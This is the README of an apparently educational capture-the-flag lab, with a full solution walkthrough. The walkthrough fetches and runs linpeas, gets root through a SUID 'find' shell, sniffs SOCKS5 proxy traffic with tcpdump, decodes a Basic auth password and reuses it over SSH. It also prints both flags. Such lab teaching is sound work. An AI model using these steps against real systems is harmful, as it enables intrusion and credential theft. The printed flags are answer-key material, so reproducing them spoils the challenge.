# Jump Around

This challenge is about privilege escalation and sniffing socks5 proxy traffic

The challenge starts 3 servers:

1. Server A (172.20.0.45)
    * simple HTTP server that represents some application
    * not very important 
2. Server B (172.20.0.47)
    * Running SSH server and Socks5 proxy
    * Students gets SSH credentials for restricted user
3. Server C (172.20.0.49)
    * Running SSH server and 
    * Periodically runs a script that sends HTTP login requests to the server A via the proxy in server B (represents victim's actions)
    * The credentials sent in the HTTP login requests are the same as credentials for the local SSH

### Tasks

1. First task is for student to escalate privileges to root in server B
2. When student has root access, (s)he should realize there is a socks5 proxy running and try to sniff traffic. There are credentials to server C in the traffic.

## How to solve
<details>
  <summary>Click to reveal how to solve steps</summary>

1. Connect to the server B with provided credentials from the description of the 1st task and run linpeas.sh

```bash
root@hackerlab:~# ssh bob@172.20.0.47
...
bob@a87a002f6fe0:~$ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
...
bob@a87a002f6fe0:~$ chmod +x linpeas.sh 
bob@a87a002f6fe0:~$ ./linpeas.sh
...
```

The output should have a glowing yellow colour on find command in SUID bits section signalising it's very likely a priv esc opportunity
```bash
-rwsr-sr-x 1 root root 220K Jan  8  2023 /usr/bin/find
```

2. Find `find` tool in GTFO bins - https://gtfobins.github.io/gtfobins/find/
3. We can escalate privileges using command
```bash
bob@a87a002f6fe0:~$ find . -exec whoami \; -quit
root
```

4. Like this we can spawn a shell and read the filesystem to find the 1st flag
```bash
bob@a87a002f6fe0:~$ find . -exec bash -p \; -quit
bash-5.2# whoami
root
bash-5.2# ls /root
flag.txt
bash-5.2# cat /root/flag.txt
BSY{QQgCzB3HmryOC7aijBJfeylUYOzgMviOIkdBzlMmGYgJWoY4Sz21s3ZcIPiW}
```

5. Second task tells us to find out what is the system used for. In output of processes we see a lot `danted` keyword
```bash
bash-5.2# ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   3924  3040 ?        Ss   18:08   0:00 /bin/bash /opt/start.sh
root           8  0.0  0.0  28280  4536 ?        Ss   18:08   0:00 danted -f /etc/danted.conf -D
root           9  0.0  0.0  15428  9496 ?        S    18:08   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root          10  0.0  0.0  27984  4020 ?        S    18:08   0:00 danted: monitor-child
root        9501  0.0  0.0  17592 10936 ?        Ss   18:12   0:00 sshd: bob [priv]
bob         9508  0.0  0.0  17852  7092 ?        S    18:12   0:00 sshd: bob@pts/0
bob         9509  0.0  0.0   4188  3484 pts/0    Ss   18:12   0:00 -bash
root        9516  0.0  0.0  28412  4168 ?        S    18:12   0:00 danted: request-child: 0/1
root        9517  0.0  0.0  28412  4168 ?        S    18:12   0:00 danted: request-child: 0/1
root        9518  0.0  0.0  28412  4168 ?        S    18:12   0:00 danted: request-child: 0/1
root        9519  0.0  0.0  28412  4168 ?        S    18:12   0:00 danted: request-child: 0/1
root        9521  0.0  0.0  28412  4168 ?        S    18:12   0:00 danted: request-child: 0/1
root        9522  0.0  0.0  29736  5868 ?        S    18:12   0:00 danted: io-child: 0/32 (0 in
root        9523  0.0  0.0  28412  4168 ?        S    18:12   0:00 danted: request-child: 0/1
root        9526  0.0  0.0  28412  4168 ?        S    18:12   0:00 danted: request-child: 0/1
root        9529  0.0  0.0  28976  4888 ?        S    18:12   0:00 danted: negotiate-child: 0/9
root        9530  0.0  0.0  28412  4168 ?        S    18:12   0:00 danted: request-child: 0/1
root        9531  0.0  0.0  28808  4460 ?        S    18:12   0:00 danted: negotiate-child: 0/9
root        9532  0.0  0.0  28412  4168 ?        S    18:12   0:00 danted: request-child: 0/1
root        9533  0.0  0.0  28412  4168 ?        S    18:13   0:00 danted: request-child: 0/1
root        9534  0.0  0.0  28412  4168 ?        S    18:13   0:00 danted: request-child: 0/1
root        9535  0.0  0.0  28412  4168 ?        S    18:13   0:00 danted: request-child: 0/1
root        9536  0.0  0.0  28412  4168 ?        S    18:13   0:00 danted: request-child: 0/1
root        9537  0.0  0.0  28412  4168 ?        S    18:13   0:00 danted: request-child: 0/1
root        9538  0.0  0.0  28412  4168 ?        S    18:13   0:00 danted: request-child: 0/1
root        9540  0.0  0.0  28412  4168 ?        S    18:13   0:00 danted: request-child: 0/1
root        9541  0.0  0.0  29468  4804 ?        S    18:13   0:00 danted: io-child: 0/32 (0 in
root        9542  0.0  0.0   4616  1460 pts/0    S+   18:13   0:00 find . -exec ps aux ; -quit
root        9543  0.0  0.0   8088  3960 pts/0    R+   18:13   0:00 ps aux 
```
By googling the `danted` keyword students should realize it's a proxy. The task description also suggests someone is using the machine so someone might be using the proxy. Since
students are now root, they can try to sniff traffic

6. By sniffing the traffic we can see some HTTP traffic coming from IP `172.20.0.49`
```bash
bash-5.2# tcpdump -n -v -A not port 22
tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
...
18:15:49.104586 IP (tos 0x0, ttl 64, id 5254, offset 0, flags [DF], proto TCP (6), length 220)
    172.20.0.49.42200 > 172.20.0.47.1080: Flags [P.], cksum 0x5957 (incorrect -> 0x799f), seq 15:183, ack 13, win 502, options [nop,nop,TS val 3800977738 ecr 2764428910], length 168
E.....@.@......1.../...8......
c....YW.....
..QJ...nPOST /login HTTP/1.1
Host: 172.20.0.45
User-Agent: curl/7.88.1
Accept: */*
Authorization: Basic YWRtaW46c3VwZXItc2VjcmV0LXBhc3N3b3JkLWNhbm5vdC1iZS1ndWVzc2VkCg==
 
```
7. There is Authorization header of Basic type (base64 encoded credentials). We can decode it to see the credentials
```
root@hackerlab:~# echo "YWRtaW46c3VwZXItc2VjcmV0LXBhc3N3b3JkLWNhbm5vdC1iZS1ndWVzc2VkCg==" | base64 -d
admin:super-secret-password-cannot-be-guessed
```

8. The `172.20.0.49` seems to have only SSH running
```bash
root@hackerlab:~# nmap 172.20.0.49
Starting Nmap 7.93 ( https://nmap.org ) at 2024-10-30 18:17 UTC
Nmap scan report for scl-challenge-victim.playground-net (172.20.0.49)
Host is up (0.0000080s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 02:42:AC:14:00:31 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

9. Maybe someone is reusing passwords and the credentials could work for the SSH? Yes, that's correct.

```bash
root@hackerlab:~# ssh admin@172.20.0.49
admin@172.20.0.49 password: 
Linux 5249928d2b8f 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Oct 30 18:19:33 2024 from 172.20.0.2

admin@5249928d2b8f:~$ ls
flag.txt

admin@5249928d2b8f:~$ cat flag.txt
BSY{THd8a6l0GCoRDpRThK9z1FnoEcl0y0cV8CTUGNBWwXHXAC5XDyNVqIP5mDHH}
```

Voilá, we found the 2nd flag! Congrats.

</details>

## Testing


The script [auto-solve.sh](./auto-solve.sh) automatically verifies that the challenge can be solved.
